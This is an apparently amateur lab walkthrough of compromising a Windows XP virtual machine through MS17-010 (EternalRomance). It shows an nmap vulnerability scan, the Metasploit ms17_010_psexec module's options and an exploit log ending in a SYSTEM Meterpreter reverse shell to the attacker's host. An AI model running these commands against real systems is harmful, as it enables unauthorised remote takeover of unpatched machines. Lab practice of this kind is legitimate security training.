1, First, I try to find axploit via nmap by typing nmap -sV --script vuln {RHOST}

Output:

tarting Nmap 7.91 ( https://nmap.org ) at 2020-10-19 23:43 EDT

Nmap scan report for 192.168.123.46

Host is up (0.000059s latency).

Not shown: 997 closed ports

PORT    STATE SERVICE      VERSION

135/tcp open  msrpc        Microsoft Windows RPC

139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn

445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds

MAC Address: 00:0C:29:6A:63:39 (VMware)

Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:

|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

| smb-vuln-ms08-067: 

|   VULNERABLE:

|   Microsoft Windows system vulnerable to remote code execution (MS08-067)

|     State: LIKELY VULNERABLE

|     IDs:  CVE:CVE-2008-4250

|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,

|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary

|           code via a crafted RPC request that triggers the overflow during path canonicalization.

|           
|     Disclosure date: 2008-10-23

|     References:

|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

|_smb-vuln-ms10-054: false

|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

| smb-vuln-ms17-010: 

|   VULNERABLE:

|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

|     State: VULNERABLE

|     IDs:  CVE:CVE-2017-0143

|     Risk factor: HIGH

|       A critical remote code execution vulnerability exists in Microsoft SMBv1

|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14

|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 29.22 seconds

CVE 2017-0143(MS17-010) is Vulnerable so we ganna attack that one.

2,Search to see if this model is avaliable on Metasploit by typing "search MS17-010"

We ganna use "exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution" today

3,Select this model by typing "use exploit/windows/smb/ms17_010_psexec" 

4,We need to check what information is required by typing "show options"

odule options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   
   ----                  ---------------                                                 --------  -----------
   
   DBGTRACE              false                                                           yes       Show extra debug trace info
   
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   
   RHOSTS                192.168.123.46                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  
   RPORT                 445                                                             yes       The Target port (TCP)
   
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   
   SERVICE_NAME                                                                          no        The service name
   
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   
   SMBPass                                                                               no        The password for the specified username
   
   SMBUser                                                                               no        The username to authenticate as
   


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   
   ----      ---------------  --------  -----------
   
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   
   LHOST     192.168.123.50   yes       The listen address (an interface may be specified)
   
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   
   --  ----
   
   0   Automatic
   
   Most of the Info either preconfigure or isn't requirement, so we only need to configure RHOST(RemoteHost)

5,Set RHOST(RemoteHost) by typing set RHOST {Remote IP}

6,Type run to start the attack

Output

[*] Started reverse TCP handler on 192.168.123.50:4444 

[*] 192.168.123.46:445 - Target OS: Windows 5.1

[*] 192.168.123.46:445 - Filling barrel with fish... done

[*] 192.168.123.46:445 - <---------------- | Entering Danger Zone | ---------------->

[*] 192.168.123.46:445 -        [*] Preparing dynamite...

[*] 192.168.123.46:445 -                [*] Trying stick 1 (x86)...Boom!

[*] 192.168.123.46:445 -        [+] Successfully Leaked Transaction!

[*] 192.168.123.46:445 -        [+] Successfully caught Fish-in-a-barrel

[*] 192.168.123.46:445 - <---------------- | Leaving Danger Zone | ---------------->

[*] 192.168.123.46:445 - Reading from CONNECTION struct at: 0x85f6e760

[*] 192.168.123.46:445 - Built a write-what-where primitive...

[+] 192.168.123.46:445 - Overwrite complete... SYSTEM session obtained!

[*] 192.168.123.46:445 - Selecting native target

[*] 192.168.123.46:445 - Uploading payload... VpmcMLGd.exe

[*] 192.168.123.46:445 - Created \VpmcMLGd.exe...

[+] 192.168.123.46:445 - Service started successfully...

[*] 192.168.123.46:445 - Deleting \VpmcMLGd.exe...

[*] Sending stage (176195 bytes) to 192.168.123.46

[*] Meterpreter session 2 opened (192.168.123.50:4444 -> 192.168.123.46:1061) at 2020-10-20 00:14:52 -0400

Andddd Success!



